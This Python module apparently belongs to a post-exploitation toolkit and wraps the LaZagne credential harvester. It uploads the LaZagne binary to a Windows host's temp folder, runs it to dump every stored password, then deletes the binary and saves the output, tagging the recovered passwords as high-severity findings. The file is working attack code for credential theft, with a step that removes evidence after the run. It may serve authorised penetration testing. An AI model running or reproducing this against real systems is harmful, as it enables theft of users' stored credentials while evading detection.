"""LaZagne wrapper: run the credential harvester, classify its output.
LaZagne prints `Password: <x>` lines which scan_line picks up directly."""
from __future__ import annotations

from ...models import Finding
from ...patterns import scan_line
from ..base import Module, register
from ._util import resolve_tool, save_text, skip

_CANDIDATES = [
    "lazagne.exe",
    "LaZagne.exe",
    "/usr/share/lazagne/lazagne.exe",
    "/opt/LaZagne.exe",
]


@register
class LazagneWrapper(Module):
    name = "lazagne"

    def triggers(self, ctx) -> bool:
        return ctx.os == "windows"

    def collect(self, session):
        local = resolve_tool(_CANDIDATES, "REAP_LAZAGNE")
        if not local:
            return skip("LaZagne", "binary not found (set REAP_LAZAGNE)", self.name)
        remote = r"C:\Windows\Temp\lz.exe"
        try:
            session.upload(local, remote)
        except Exception as exc:
            return skip("LaZagne", f"upload failed: {exc}", self.name)
        out = session.exec(f'"{remote}" all -quiet', timeout=240).stdout
        session.exec(f'del /f /q "{remote}"')
        path = save_text(session.host, "lazagne.txt", out)
        findings = [Finding(type="info", title="LaZagne output captured", severity="low",
                            detail=str(path), source_module=self.name)]
        for f in scan_line(out, "lazagne output"):
            f.severity = "high"
            f.source_module = self.name
            findings.append(f)
        return findings
